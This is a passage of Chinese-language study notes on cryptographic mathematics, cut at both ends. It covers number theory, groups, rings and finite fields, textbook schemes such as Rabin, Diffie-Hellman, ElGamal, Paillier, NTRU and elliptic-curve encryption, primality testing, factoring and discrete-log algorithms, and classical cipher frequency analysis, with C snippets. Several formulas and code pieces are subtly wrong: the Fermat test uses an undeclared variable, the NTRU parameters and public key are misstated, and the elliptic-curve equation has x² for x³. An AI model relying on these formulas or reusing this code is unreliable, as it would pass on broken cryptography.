(\\frac{-1}{p})=\\begin{cases} \u0026amp;1,\\ \u0026amp;p\\%4=1\\\\ \u0026amp;-1,\\ \u0026amp;p\\%4=3 \\end{cases}$$\n$$ (\\frac{2}{p})=\\begin{cases} \u0026amp;1,\\ \u0026amp;p\\%8=1,7\\\\ \u0026amp;-1,\\ \u0026amp;p\\%8=3,5 \\end{cases}$$\n二次互反: $(\\frac{p}{q})(\\frac{q}{p})=(-1)^{\\frac{p-1}{2}\\frac{q-1}{2}}$, $p\\ne q$ 为奇素数.\nGuass: 奇素数 $p$, $a\\in\\mathbb{Z}$, ${\\rm gcd}(a,p)=1$, 设 $M_{a,p}=\\{ka\\%p, \\ k=1,2,\u0026hellip;,\\frac{p-1}{2}\\ |\\ ka\\%p\u0026gt;\\frac{p}{2}\\}$, 记 $m(a,p)=|M_{a,p}|$, 则 $(\\frac{a}{p})=(-1)^{m(a,p)}$.\n设 $K=\\{ka\\%p\\ |\\ k=1,2,\u0026hellip;,\\frac{p-1}{2}\\}$, $b_i\\in M$, $c_j\\in M-K$, $i=1,2,..,m(a,p)$, $j=1,2,\u0026hellip;,\\frac{p-1}{2}-m(a,p)$.\n显然有 $c_j\\ne p-b_i$, $\\forall i,j$; 否则 $p|b_i+c_j$, 即 $\\exists x,y\\in\\mathbb{Z}$, $x,y\u0026lt;\\frac{p}{2}$ s.t. $p|a(x+y)$, 但 $x+y\u0026lt;p$, 矛盾.\n故 $a^{\\frac{p-1}{2}}(\\frac{p-1}{2})!\\equiv\\prod c_j \\prod (p-b_i)\\equiv (-1)^{m(a,p)}(\\frac{p-1}{2})!({\\rm mod}\\ p)$.\nEisenstein: $a$ 为奇数时, 记$e(a,p)=\\sum\\lfloor\\frac{ka}{p}\\rfloor$, 有 $e(a,p)\\equiv m(a,p)({\\rm mod}\\ 2)$.\n不妨设 $ka=d_kp+r_k$, $0\\leq r_k\\leq p-1$, $d_k,r_k\\in\\mathbb{Z}$, 有 $p\\sum d_k+\\sum r_k=\\sum ka = \\sum c_j+\\sum (p-b_i)$, 故 $\\sum d_k\\equiv m(a,p)({\\rm mod}\\ 2)$; 显然 $e(a,p)=\\sum d_k$.\n$q\\ne p$ 为奇素数时, $\\not\\exists x,y\\in\\mathbb{Z}$, $x,y\u0026lt;\\frac{p}{2}$ s.t. $xp=qy$, 即 $e(p,q)+e(q,p)=\\frac{p-1}{2}\\frac{q-1}{2}$.\n$a=2$ 时, $\\lfloor\\frac{p}{4}\\rfloor\\leq k\\leq \\lfloor\\frac{p}{2}\\rfloor$, 有 $m=\\lfloor\\frac{p}{2}\\rfloor-\\lfloor\\frac{p}{4}\\rfloor$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int fastLegendre(int a, int p){ int s; int e = 0; if (a == 0 || a == 1){ return a; } else { while (a%2 == 0){ a /= 2; ++e; } if (e%2 == 0 || p%8 == 1 || p%8 == 7){ s = 1; } else { s = -1; } if (p%4 == 3 \u0026amp;\u0026amp; a%4 == 3){ s = -s; } if (a == 1){ return s; } else { return s*fastLegendre(p%a,a); } } } Rabin: 素数 $p\\equiv q\\equiv 3({\\rm mod}\\ 4)$. 公钥 $n=pq$, 加密 $c\\equiv E_{n}(m)\\equiv m^2({\\rm mod}\\ n)$. 私钥 $(p,q)$, 解密 $m\\equiv D_{p,q}(c)\\equiv \\pm c^{\\frac{p+1}{4}}({\\rm mod}\\ p)\\equiv \\pm c^{\\frac{q+1}{4}}({\\rm mod}\\ q)\\ (2\\ {\\rm in}\\ 4)$. 原根 原根: $a,m\\in\\mathbb{Z}$, $m\u0026gt;1$, ${\\rm gcd}(a,m)=1$, 记 ${\\rm ord}_m(a)=\\inf\\{x\\in\\mathbb{Z}_+\\ | \\ a^x\\equiv 1({\\rm mod}\\ m)\\}$ 称为 $a$ 对模 $m$ 的阶; 特别, ${\\rm ord}_m(a)=\\varphi(m)$ 时称 $a$ 为模 $m$ 的原根.\n定理: $a,m\\in\\mathbb{Z}$, $m\u0026gt;1$, ${\\rm gcd}(a,m)=1$, 则 $a^n\\equiv 1({\\rm mod}\\ m)\\iff {\\rm ord}_m(a)|n$. 特别, ${\\rm ord}_m(a)|\\varphi(m)$.\n定理: $g$ 为模 $m$ 原根 $\\iff g^{\\frac{\\varphi(m)}{p_i}}\\not\\equiv 1({\\rm mod}\\ m)$, $\\forall$ 素数 $p_i|\\varphi(m)$.\n必要性: 显然.\n充分性: 若 $\\exists e\u0026lt;\\varphi(m)$ s.t. $g^e\\equiv 1({\\rm mod}\\ m)$; 不妨设 $\\frac{\\varphi(m)}{e}=kp$, $k\\in\\mathbb{Z}$, $p$ 为素数; 进而 $g^{\\frac{\\varphi(m)}{e}\\equiv(g^p)^k\\equiv 1({\\rm mod}\\ m)}$, 矛盾.\n定理: $a,m,d\\in\\mathbb{Z}_+$, ${\\rm gcd}(a,m)=1$, ${\\rm ord}_m(a^d)=\\frac{{\\rm ord}_m(a)}{{\\rm gcd}({\\rm ord}_m(a),d)}$. 推论: 模 $m$ 存在原根时, 有 $\\varphi(\\varphi(m))$ 个原根; 同时原根为模 $m$ 上本原多项式的全部解. 以下显然: ${\\rm ord}_m(a)={\\rm ord}_m(a^{-1})$. $b\\equiv a({\\rm mod}\\ m)$, 则 ${\\rm ord}_m(b)={\\rm ord}_m(a)$. ${\\rm gcd}(a,m)=1$, $a^0,a^1,\u0026hellip;,a^{{\\rm ord}_m(a)-1}$ 两两模 $m$ 不同余. 特别, $g$ 为模 $m$ 原根时, 恰好有 $\\mathbb{Z}_p^*={g^0,g^1,\u0026hellip;,g^{\\varphi(g)-1}}$. $g$ 为模 $m$ 原根时, $x,y\\in\\mathbb{Z}$, $g^x\\equiv g^y({\\rm mod}\\ m) \\iff x\\equiv y({\\rm mod}\\ \\varphi(m))$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 bool nMod1(int a, int n, int p, int* primeFact){ int num = 0, r; while(primeFact[num]){ r = fastPowerMod(a,n/primeFact[num],p); if (r == 1){ break; } else { ++num; } if(!primeFact[num]) { return true; } } return false; } int minPrimeRoot(int p){ int n = p-1, res = 0; int primeFact[10] = {0}; factPrime(n,primeFact); for (int i = 2; i \u0026lt;= p/2; ++i) { if (nMod1(i,n,p,primeFact)){ res = i; break; } } return res; } D-H协议: 大素数 $p$ 和模 $p$ 原根 $g$, 任选 $2\\leq x,y\\leq p-2$. 公钥 $(p,g)$, 私钥 $x,y$. 握手: $k_{X\\to Y}\\equiv g^x({\\rm mod}\\ p)$, $k_{Y\\to X}\\equiv g^y({\\rm mod}\\ p)$. 密钥: $k\\equiv k_{Y\\to X}^x\\equiv k_{X\\to Y}^y \\equiv g^{xy}({\\rm mod}\\ p)$.\nElGamal: 大素数 $p$ 和模 $p$ 原根 $g$, 任选 $2\\leq a\\leq p-2$, $Y_a\\equiv g^a({\\rm mod}\\ p)$. 公钥 $(p,g,Y_a)$, 加密 $u\\equiv g^k({\\rm mod}\\ p)$, $v\\equiv mY_a^k({\\rm mod}\\ p)$, $c=E_{p,g,Y_a,k}(m)=(u,v)$, 任选 $2\\leq k\\leq p-2$. 私钥 $a$, 解密 $m\\equiv D_a(c)\\equiv \\frac{v}{u^a}({\\rm mod}\\ p)$. 群 有限群: 非空有限集 $G$ 上代数运算满足结合律, 存在单位元(记 $e$), 逆元(记 $a^{-1}$); 记 $|G|={\\rm Card}(G)$ 为阶; 定义 $a^{-n}=(a^{-1})^n$, $a^0=e$.\n半群: 只满足结合律. 幺半群: 存在单位元的半群. 交换半群: 满足交换律的半群. 交换幺半群: 存在单位元满足交换律的半群. Abel群: 满足交换律的群. 消去律: 可由结合律和逆元推得.\n元素的阶: $|a|=\\inf \\{n\\in\\mathbb{N}_+\\ |\\ a^n = e\\}$ 或 $\\infty$; $|a^{-1}|=|a|$, $|a^d|=\\frac{|a|}{{\\rm gcd}(|a|,d)}$; 若 $n\\in\\mathbb{Z}$, $a^n=e$ 则 $|a||n$.\n不妨设 $|a|=n$, $|a^d|=m$, 由于 $a^{dm}=e$, 即 $n|dm$, 进而 $\\frac{n}{{\\rm gcd}(n,d)}|\\frac{d}{{\\rm gcd}(n,d)}m$, 即 $\\frac{n}{{\\rm gcd}(n,d)}|m$.\n同时 $(a^d)^{\\frac{n}{{\\rm gcd}(n,d)}}=e$, 即 $m|\\frac{n}{{\\rm gcd}(n,d)}$.\n子群: 群 $G$ 的非空子集 $H$ 关于 $G$ 的代数运算构成群, 记 $H\u0026lt;G$; 真子群即非平凡子群({e},G); $H\u0026lt;G$ 则 $e\\in H$, $e\\in G$, 且 $\\forall a\\in H$, $a^{-1}\\in G$; $H\u0026lt;G \\iff \\forall a,b\\in H$, $ab^{-1}\\in H$.\n循环群: 群 $G$ 的非空子集 $S$, 生成子群 $\\langle S\\rangle=\\bigcap_{S\\subset H\u0026lt;G}H=\\{\\prod a_i^{l_i}\\ |\\ a_i\\in S, l_i=\\pm 1\\}$; 特别 $S=\\{a\\}$ 时, 循环子群 $\\langle S\\rangle=\\langle a\\rangle=\\{a^n\\ |\\ n\\in\\mathbb{Z}\\}$; 特别 $G=\\langle a\\rangle$ 时为循环群 $\\iff\\exists a\\in G$ s.t. $|a|=|G|$; 循环群子群仍为循环群; 无限循环群同构于 $\\mathbb{Z}$, $n$ 阶循环群同构于 $\\mathbb{Z}_n$.\n不妨设 $H\u0026lt;G=\\langle a\\rangle$, $H\\ne {e}$, $\\exists a^k\\in H$, $a^{-k}\\in H$, 则 $\\exists r,t\\in\\mathbb{Z}_+$, $q\\in\\mathbb{Z}$ s.t. $a^r\\in H$, $n=qr+t$; 进而 $a^n=a^{qr+t}\\in H$ 即 $t=0$, 故 $H\\subset \\langle a^r\\rangle$.\n陪集: $H\u0026lt;G$, $\\forall a\\in G$, $aH$ 为左陪集; $a\\in aH$, $aH=H\\iff a\\in H$, $aH=bH$ 或 $aH\\cap bH=\\empty$, $|H|=|aH|$; $G=\\bigcup_{g\\in G}gH$.\nLagrange: 记 $[G:H]=\\frac{|G|}{|H|}$, $|G|=[G:H]|H|$; $|a|||G|$.\n正规子群: $H\u0026lt;G$, $\\forall a\\in G$, $aH=Ha$, 记 $H\\lhd G$; $H\u0026lt;G$, $\\forall a\\in G$, $H\\lhd G \\iff aHa^{-1}=H \\iff aHa^{-1} \\subset H \\iff aha^{-1}\\in H$, $\\forall h\\in H$.\n商群: $H\\lhd G$, $G/H=\\{aH\\ |\\ a\\in G\\}$, $aH\\ast bH=(ab)H$.\n同态: 保持代数运算不变的映射, 双射时为同构. 群同态: 群 $G_1,G_2$, 映射 $f:G_1\\to G_2$, $f(ab)=f(a)f(b)$, $\\forall a,b\\in G_1$.\n同态 Paillier: 素数 $p,q$, $n=pq$, $\\lambda = {\\rm lcm}(p-1)(q-1)$ 最小公倍数, $g\\in\\mathbb{Z}_{n^2}^*$ s.t. ${\\rm gcd} (\\frac{g^\\lambda \\% n^2 -1}{n},n)=1$. 公钥 $(n,g)$, 加密 $c\\equiv E_{n,g}(m)\\equiv g^m r^n({\\rm mod}\\ n^2)$, $r\\in\\mathbb{Z}_n^*$. 私钥 $\\lambda$, 解密 $m\\equiv D_\\lambda(c)\\equiv\\frac{c^\\lambda \\%n-1}{g^\\lambda \\\u0026amp;n-1}({\\rm mod}\\ n^2)$. 加法同态: $m_1+m_2=D_\\lambda[E_{n,g}(m_1)E_{n,g}(m_2)]$. 置换群: 非空集合 $X$ 上所有可逆变换(双射)关于复合构成对称群 $S_x$; $S_x$ 子群称为变换群; 特别 $|X|=n$ 时, 记 $S_x = S_n$, $S_n$及其子群称为置换群, 元素 $\\sigma$ 称为置换; $|S_n|=n!$.\n轮换: $f\\in S_n$, $i_1,\u0026hellip;,i_r\\in X$, $f(i_1)=i_2,\u0026hellip;,f(i_{r-1})=i_r,f(i_r)=i_1$ 且保持其他元素不变时, $f=(i_1,i_2,\u0026hellip;,i_r)$ 称为 $r$ -轮换; 特别 $r=1$ 时为恒等变换, $r=2$ 时称为对换; 任意置换可唯一表示为不相交的轮换之积; 任意轮换可以表示为对换之积.\nCayley: 任意有限群同构于一置换群.\n环和域 环: 非空集合 $R$ 上两个代数运算 $(+,\\cdot)$, $(R,+)$ 为Abel群, $(R,\\cdot)$ 为半群, $\\cdot$ 对 $+$ 有双边分配律; 为区别, $+$ 的单位元称为零元(记 $0$), 逆元称为负元(记 $-a$). 单位: $a\\in R$, $\\exists b\\in R$ s.t. $ab=ba=e$, 则称 $a$ 为单位; 环中所有单位构成单位群, 记 $U(R)$; $U(\\mathbb{Z}_m)=\\mathbb{Z}_m^*$. 零因子: 非零元 $a,b\\in R$ s.t. $ab=0$, $a$ 为 $b$ 的左零因子.\n交换环: $(R,\\cdot)$ 为交换半群. 交换幺环: $(R,\\cdot)$ 为交换幺半群. 无零因子环: $(R,\\cdot)$ 为无零因子半群. 整环: $(R,\\cdot)$ 为无零因子交换幺半群. 域: $(R-\\{0\\},\\cdot)$ 为Abel群.\n双边理想: 非空集合 $I\\subset R$, $I$ 对 $+$ 封闭, 对 $\\cdot$ 吸收, 即 $\\forall s\\in R$, $sI\\subset I$, $Is\\subset I$, 记 $I \\lhd R$; $d\\mathbb{Z}\\lhd\\mathbb{Z}$.\n商环: $I\\lhd R$, $R/I \u0026lt; R$; $R/I=\\{a+I\\ | \\ a\\in R\\}$. $(a+I)+(b+I)=(a+b)+I$, $(a+I)(b+I)=(ab)+I$.\n映射: 不妨设 $a_1+I=a_2+I$, $b_1+I=b_2+I$, 则有 $(a_1b_1)+I=(a_2b_2)+I$. 考虑 $a_1-a_2\\in I$, $b_1-b_2\\in I$, 有 $a_1=s+a_2$, $b_1=t+b_2$, $s, t\\in I$, 进而 $a_1b_1=a_2b_2+x=a_2b_2+(sb_2+ta_2+st)$, 同时 $x\\in I$.\n封闭: $\\forall x\\in I$, $(a+x)(b+x)=ab+(a+b+x)x\\in (ab)+I$.\n由此可知, 理想的吸收性可确保商环存在.\n生成理想: 非空集合 $S\\subset R$, 包含 $S$ 的所有理想的交集; 特别 $S=\\{a\\}$ 时, 记 $\\langle S\\rangle=\\langle a\\rangle$ 为 $a$ 生成的主理想; 特别 $R$ 为交换幺环时, 主理想 $\\langle a\\rangle=\\{ra\\ | \\ r\\in R\\}$; $\\mathbb{Z}$ 的所有理想均为主理想.\n任取非平凡理想 $I\\lhd \\mathbb{Z}$, $\\exists$ 最小 $t\\in\\mathbb{Z}_+$, $\\forall m\\in I$, $m=qt+r$, $q,r\\in I$, $0\\leq r\u0026lt;t$, 即 $r=0$, $I=\\langle t\\rangle$.\n素理想: 交换幺环 $R$, 非平凡 $P\\lhd R$, 若 $ab\\in P$, 有 $a\\in P$ 或 $b\\in P$; 特别整环中, 素元 $p$, $\\langle p\\rangle$ 为素理想. 交换幺环 $R$, $P\\lhd R$, $R/P$ 为整环 $\\iff P$ 为素理想. 极大理想: 交换幺环 $R$, 非平凡 $M\\lhd R$, 无真包含 $M$ 的非平凡理想. 交换幺环 $R$, $M\\lhd R$, $R/M$ 为域 $\\iff M$ 为极大理想. 极大理想一定为素理想, 反之不然.\nEuclid整环(ED): 满足Euclid性的整环, $\\forall a,b\\in R-\\{0\\}$, 有映射 $\\varepsilon: R-\\{0\\}\\to \\mathbb{Z}_+$ s.t. $\\varepsilon(a)\\leq\\varepsilon(ab)$, $\\exists r,q\\in R$ s.t. $a=bq+r$, $\\varepsilon(r)\u0026lt;\\varepsilon(b)$ 或 $r=0$; 其上有最大公因数. 主理想整环(PID): 理想均为主理想的整环; 其上素元和不可约元等价, 素理想和极大理想等价; 素元为非零元非单位 $p$ s.t. $a,b\\in R$, 若 $p|ab$, 有 $p|a$ 或 $p|b$; 不可约元为非零元非单位 $q$ s.t. $a,b\\in R$, 若 $q=ab$, 有 $a$ 或 $b$ 为单位. 唯一析因整环(UFD): 整环 $R$ 中非零元非单位的元素可以唯一表示为有限个不可约元的积.\n定理: 所有域都是ED; 所有ED都是PID; 所有PID都是UFD.\n特征: ${\\rm char}(R)=\\inf\\{n\\in\\mathbb{Z}_+\\ | \\ na=a,\\forall a\\in R\\}$ 或0; ${\\rm char}(\\mathbb{Z})=0$, ${\\rm char}(\\mathbb{Z}_m)=m$; 整环特征必为0或素数, 非空有限域特征必为素数, ${\\rm char}(F_p)=p$; $\\forall a,b\\in F_p$, $(a+b)^p=a^p+b^p$.\n$|e| = \\infty$ 时, ${\\rm char}(R)=0$.\n$|e| = n$ 时, 若 $n$ 为合数, $\\exists p|n$，不妨设 $pc=n$, $ne=(pe)(ce)=0$, 则 $pe=0$ 或 $ce=0$, 矛盾. $\\forall a\\in R$, $na=(ne)a=0$.\n单变量多项式环: 整环 $R$ 上整环 $R[x]=\\{a_nx^n+\u0026hellip;+a_1x+a_0\\ | \\ a_i\\in R\\}$; 记 $f(x)=a_nx^n+\u0026hellip;+a_1x+a_0$, $a_n\\ne 0$ 时, 记 ${\\rm deg}f=n$; 特别 ${\\rm deg}0=-\\infty$. $f(x),g(x),h(x)\\in R[x]$, $f(x)g(x)=h(x)$, 则 ${\\rm deg}f+{\\rm deg}g={\\rm deg}h$. 域 $K$, $f(x)\\in K[x]$, ${\\rm deg}f\u0026gt;0$, $p(x)$ 为 $f(x)$ 次数最小的因式, 则 $p(x)$ 为 $K[x]$ 上不可约多项式, 且 ${\\rm deg}p\\leq \\frac{1}{2}{\\rm deg}f$.\n带余除法: $f(x),g(x)\\in R[x]$, 则 $\\exists q(x),r(x)\\in R[x]$ s.t. $f(x)=q(x)g(x)+r(x)$, ${\\rm deg}r\u0026lt;{\\rm deg}g$. $f(x)\\in R[x]$, $a\\in R$, 则 $\\exists q(x)$ s.t. $f(x)=(x-a)q(x)+f(a)$. $f(x)\\in R[x]$, $a\\in R$, 则 $x-a|f(x)\\iff f(a)=0$. 同余: 首一多项式 $m(x)\\in R[x]$, $f(x),g(x)\\in R[x]$, $m(x)|f(x)-g(x)$, 记 $f(x)\\equiv g(x)({\\rm mod}\\ m(x))$.\nEuclid: 域 $K$ 上 $K[x]$ 为ED; 即有Euclid性和最大公因式. $f(x),g(x)\\in K[x]$, $g(x)|f(x)\\iff r(x)=0$. $f(x)\\in K[x]$, $\\forall K[x]$ 上不可约多项式 $p(x)$, ${\\rm deg}p\\leq {\\rm deg}f$, s.t. $p(x)\\nmid f(x)$, 则 $f(x)$ 为 $K[x]$ 上不可约多项式.\n定理: 域 $F$ 上 $F[x]$, $f(x)\\in F(x)$, 则 $F[x]/f(x)$ 为域 $\\iff f(x)$ 为 $F[x]$ 上不可约多项式. 特别有素数 $p$ 和 $F[x]$ 上不可约多项式 $degr=n$, $F_p[x]/\u0026lt;r(x)\u0026gt;=\\{\\sum_{i=0}^{n-1}a_0x^i\\ |\\ a_i\\in F_p\\}\\cong F_{p^n}$, 即有 $|F_p[x]/\u0026lt;r(x)\u0026gt;|=p^n$.\n有限域结构: $\\forall$ 素数 $p$, $n\\in\\mathbb{Z}_+$, 存在同构意义下唯一的有限域 $F_{p^n}$ s.t. $|F_{p^n}|=p^n$, ${\\rm char}(F_{p^n})=p$.\nNTRU: 环 $L=\\mathbb{Z}[x]/(x^n-1)$, $n$ 为大素数; 选取大数 $p,q$, 有 ${\\rm gcd}(p,q)=1$ 且 $q\\ll p$; 选取 $f(x),g(x)\\in L$, 有 ${\\rm deg}f={\\rm deg}g=n-1$. $f^{-1}_p(x)$ 为 $f(x)$ 系数模 $p$ 逆, $f^{-1}_q(x)$ 为 $f(x)$ 系数模 $q$ 逆; $h(x)\\equiv f^{-1}_q(x)({\\rm mod}\\ q)$. 公钥 $(n,p,q,h(x))$, 明文多项式 $m(x)=\\sum a_ix_i$ 有 $|a_i|\\leq \\frac{p-1}{2}$ 及 ${\\rm deg}m\\leq n$, 随机选取噪音 $r(x)\\in L$, 加密 $c(x)\\equiv pr(x)h(x)+m(x)({\\rm mod}\\ q)$. 私钥 $(f(x),f^{-1}_p(x))$, 解密 $d(x)\\equiv f(x)c(c)({\\rm mod}q)$, $b(x)\\equiv d(x)({\\rm mod}\\ p)$, $m(x)\\equiv f^{-1}_p(x)({\\rm mod}\\ p)$. 椭圆曲线群 定义: 域 $F$, $a,b,c,d,e\\in F$, 满足Weierstrass方程 $E=y^2+axy+by=x^3+cx^2+dx+e$ 所有点 $(x,y)$ 和无穷远点 $O$ 的集合.\nHasse定理: 有限域 $GF(p)$ 上椭圆曲线, $n$ 为 $E$ 上点 $(x,y)$, $x,y\\in\\mathbb{Z}_p$ 的个数, 则 $|n-(p+1)|\\leq 2\\sqrt p$.\n有限域上椭圆曲线: 有限域 $GF(p)$ 上椭圆曲线 $y^2\\equiv x^2+ax+b({\\rm mod}\\ p)$, $a,b,x,y\\in GF(P)$, 且满足 $4a^3+27b^2\\not\\equiv 0({\\rm mod}\\ p)$ (此时无重根), 记为 $E_p(a,b)$.\n构造: $x$ 遍历 $\\in\\mathbb{Z}_p$, $t_x\\equiv x^3+ax+b({\\rm mod}\\ p)$, $a,b\\in GF(p)$; Euler保留所有模 $p$ 二次剩余的 $t_x$, 并求出两根; $t=0$ 时只有一根 $y=0$.\n定理: $E_p(a,b)$ 关于点的加法构成Abel群. 无穷远点 $O$ 为单位元, 逆元为关于 $x$ 轴对称点, 横坐标不同的点(相同的只有自身和逆元)相加为连线延长线与曲线交点关于 $x$ 轴的对称点, 相同点相加为该点处切线与曲线交点关于 $x$ 轴的对称点.\n不妨设 $P,Q\\in E_p(a,b)$, $P,Q\\ne O$, $P=(x_1,y_1)$, $Q=(x_2,y_2)$, $R=P+Q=(x_3,y_3)\\ne O$.\n则 $x_3=\\lambda^2-x_1-x_2$, $y_3=\\lambda(x_1-x_3)-y_1$, 其中 $\\lambda=\\frac{y_2-y_1}{x_2-x_1}\\ (P\\ne Q);\\ \\frac{3x_1^2+a}{2y_1}\\ (P=Q)$.\nECDH: 椭圆曲线群 $E_p$, $G\\in E_p$, $|G|=q$ 为大素数, 任选 $2\\leq a,b\\leq q-1$. 公钥 $(p,G)$, 私钥 $x,y$. 握手: $k_{A\\to B}=aG$, $k_{B\\to A}=bG$. 密钥: $k=ak_{B\\to A}=bk_{A\\to B}=(ab)G$.\nECEG: 椭圆曲线群 $E_p$, $G\\in E_p$, $|G|=q$ 为大素数, 任选 $2\\leq d\\leq q-1$, $P=dG$. 公钥 $(P,G,E,n)$, 加密 $C_1=rG$, $C_2=M+rP$, $C=E_{E_p,P,G,r}(M)=\\{C_1,C_2\\}$, 任选 $2\\leq r\\leq q-1$. 私钥 $d$, 解密 $M=D_{E_p,d}(C)=C_2-dC_1$. 快速倍乘 $P=mG$, $m\\in\\mathbb{Z}_p$, $G\\in\\ E_p(a,b)$.\n传统算法 素数定理: $\\pi(x)$ 为 $\\leq x$ 的素数个数, 有 $\\lim_{x\\to\\infty}\\frac{\\pi(x)}{x/\\ln x}=1$.\nFermat测试: 若 $n$ 为素数, $a\\in\\mathbb{Z}$, $1\\leq a\\leq n-1$, 则 $a^{n-1}\\equiv 1({\\rm mod}\\ n)$. 随机测试 $t$ 次, 确为素数可能性大于 $1-\\frac{1}{2^t}$. 1 2 3 4 5 6 7 bool fermat(int n){ int a,r; srand((unsigned int)time(0)); a = rand()%p+1; r = fastPowerMod(a,p-1,p); return r == 1; } Solovay-Stranssen测试: Jacobi符号 $(\\frac{a}{m})=\\prod(\\frac{a}{p_i})^{\\alpha_i}$, 其中 $n=\\prod(p_i^{\\alpha_i})$. 若 $n$ 为素数, $x=(\\frac{a}{n})$, $y\\equiv a^{\\frac{n-1}{2}}({\\rm mod}\\ n)$, 则 $x\\equiv y({\\rm mod}\\ n)$. 1 2 3 4 5 6 7 8 9 bool solovayStrassenX(int p){ int a, x, y; srand((unsigned int)time(0)); a = rand()%p+1; x = jacobi(a,p); // jacobi同fastLegendre x = (x+p)%p; y = fastPowerMod(a,(p-1)/2,p); return x != 0 \u0026amp;\u0026amp; x == y; } Millar-Rabin测试: Fermat测试时, 不妨设 $a^{n-1}=(a^t)^{2^k}$, $a^t\\equiv 1({\\rm mod}\\ n)$ 则直接满足素性条件, 否则检验 $a^t$ 的 $i=1,\u0026hellip;,k-1$ 次平方, $(a^{t})^{2^i}\\equiv -1({\\rm mod}\\ n)$ 时直接满足素性条件. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 bool millerRabin(int p){ int k = 0, t = p-1, a, r; while(t%2 == 0){ t \u0026gt;\u0026gt;= 1; ++k; } srand((unsigned int)time(0)); a = rand()%p+1; r = fastPowerMod(a,t,p); if (r == 1){ return true; } else{ for (int j = 0; j \u0026lt; k; ++j) { if (r == p-1){ return true; } else { r = (1LL*r*r)%p; } } } return false; } 大合数分解: 试除法时间复杂度 $O(\\sqrt n)$.\nPollard-$\\rho$ 法: 有限集上随机函数存在碰撞; $n$ 不为素数或某个素数的幂, 寻找小因子. 1 2 3 4 5 6 7 8 9 10 11 12 13 int rho(int n){ int a = 2, b = 2, d; do { a = ((1LL*a*a)+1)%n; b = ((1LL*b*b)+1)%n; b = ((1LL*b*b)+1)%n; d = gcd(a-b,n); if ((1 \u0026lt; d) \u0026amp;\u0026amp; (d \u0026lt; n)){ return d; } } while (d != n); return -1; } Pollard-$p-1$ 法: 素数 $p|n$, $p-1$ 分解中素因子最大次幂 $q|p-1$, $\\forall B\\geq q$ s.t. $p-1|B$, 即 $2^{B!}\\equiv 2^{p-1}\\equiv 1({\\rm mod}\\ p)$, 故有 $p|{\\rm gcd}(n,2^{B!}-1)$. 1 2 3 4 5 6 7 8 9 10 11 12 int pollard(int n){ int B = 24; int a = 2; for (int i = 2; i \u0026lt;= B; ++i) { a = fastPowerMod(a,i,n); } int d = gcd(a-1,n); if ((d \u0026gt; 1) \u0026amp;\u0026amp; (d \u0026lt; n)){ return d; } return -1; } 随机平方法: $x,y\\in\\mathbb{Z}$ s.t. $x^2\\equiv y^2({\\rm mod}\\ n)$, $x\\not\\equiv\\pm y({\\rm mod}\\ n)$, 若 $n|x^2-y^2$ 且 $n\\nmid x-y$ ($n\\nmid x+y$), 则素数 $p={\\rm gcd}(x+y,n)$ ($p={\\rm gcd}(x-y,n)$). 离散对数求解: 有限域 $F_p$ 上遍历需要 $O(p)$ 次乘法.\n小步大步法(Shank): 群阶为 $n$, $m=\\lceil\\sqrt n\\rceil$, 设 $\\log_a b=x=mj+i$, $0\\leq i,j\\leq m-1$, 即 $b(a^{-i})=(a^m)^j$; 搜索树存储 $1,a^m,\u0026hellip;,(a^m)^{m-1}$, 遍历 $b(a^{-i})$ 并匹配.\nPollard-$\\rho$ 法: 素数 $p$, $a,b\\in\\mathbb{Z}_p^*$, 不妨设 $x_i=a^{m_i}b^{n_i}$, 有碰撞 $x_i=x_{2i}$ 时, 有 $\\log_a b\\equiv (n_{2i}-n_i)^{-1}(m_{2i}-m_i)({\\rm mod}\\ |a|)$.\n$$f(x_{i+1},m_{i+1},n{i_1})=\\begin{cases} (bx,m_i,n_i+1),\\ \u0026amp; x_i\\in S_1 \\\\ (x^2,2m_i,2n_i),\\ \u0026amp; x_i\\in S_2 \\\\ (ax,m_i+1,n_i),\\ \u0026amp; x_i\\in S_3 \\end{cases},\\ S_1\\sqcup S_2\\sqcup S_3=\\mathbb{Z}_p^*$$\n指数演算法: 素数 $p$, 原根 $a\\in\\mathbb{Z}_p^*$, 小素因子基 $B=\\{p_1,p_2,\u0026hellip;,p_k\\}$, 选取 $k$ 个 $1\\leq x\\leq p-2$ 均 s.t. $x\\equiv \\alpha_1\\log_a p_1+\\alpha_2\\log_a p_2+\u0026hellip;+\\alpha_k\\log_a p_k({\\rm mod}\\ p-1)$, 可解得 $\\log_a p_1,\\log_a p_2,\u0026hellip;,\\log_a p_k$; 选取 $1\\leq s\\leq p-2$ s.t. $\\log_a b+s\\equiv \\gamma_1\\log_a p_1+\\gamma_2\\log_a p_2+\u0026hellip;+\\gamma_k\\log_a p_k({\\rm mod}\\ p-1)$\nPohlig-Hellman算法: 素数 $p$, 原根 $a\\in\\mathbb{Z}_p^*$, 最小原根 $g$, $a\\equiv g^m({\\rm mod}\\ p)$, $b\\equiv g^n({\\rm mod}\\ p)$, 则 $m\\log_a b\\equiv n({\\rm mod}\\ p-1)$ 可由扩展Euclid算法给出. $p-1=\\prod_{i=1}^k p_i^{\\alpha_i}$ 中均为小素数, 有 $k$ 个同余式 $m\\equiv \\sum_{j=0}^{\\alpha_i-1} c_{ij}p_i^j({\\rm mod}\\ p_i^{k_i})$; 由 Fermat 可得 $g^{c_{ij}\\frac{p-1}{p_i^{\\alpha_i}}}\\equiv a^{\\frac{p-1}{p_i}^{\\alpha_i}}({\\rm mod}\\ p)$. 遍历并得到 $0\\leq c_{ij}\\leq p_i^{\\alpha_i}-1$; 对 $k$ 个同余式使用CRT即得到 $m$.\n古典密码 古典密码主要为置换密码和代换密码.\n置换密码: $\\sigma$ 为 $M$ 上一个置换(到自身的双射). 加密: $(c_i)=E_{k}((m_i))=\\sigma_{k_i}((m_i))$. 解密: $(m_i)=D_{k}((c-i))=\\sigma_{k_i}^{-1}((c_i))$.\n代换密码 加密: $c_i=E_{k}(m_i)\\equiv f(m_i,k)({\\rm mod}\\ 26)$. 解密: $m_i=E_{k}(c_i)\\equiv f^{-1}(c_i,k^{-1})({\\rm mod}\\ 26)$.\n单表代换可以直接通过字母频率分析破解.\n1 2 3 4 5 6 7 8 9 void freqAnalyze(char *cipher, long *cnt){ for (long n = 0; cipher[n]; ++n) { if (isupper(cipher[n])){ cnt[cipher[n]-\u0026#39;A\u0026#39;]++; } else if (islower(cipher[n])){ cnt[cipher[n]-\u0026#39;a\u0026#39;]++; } } } 粗糙度: ${\\rm 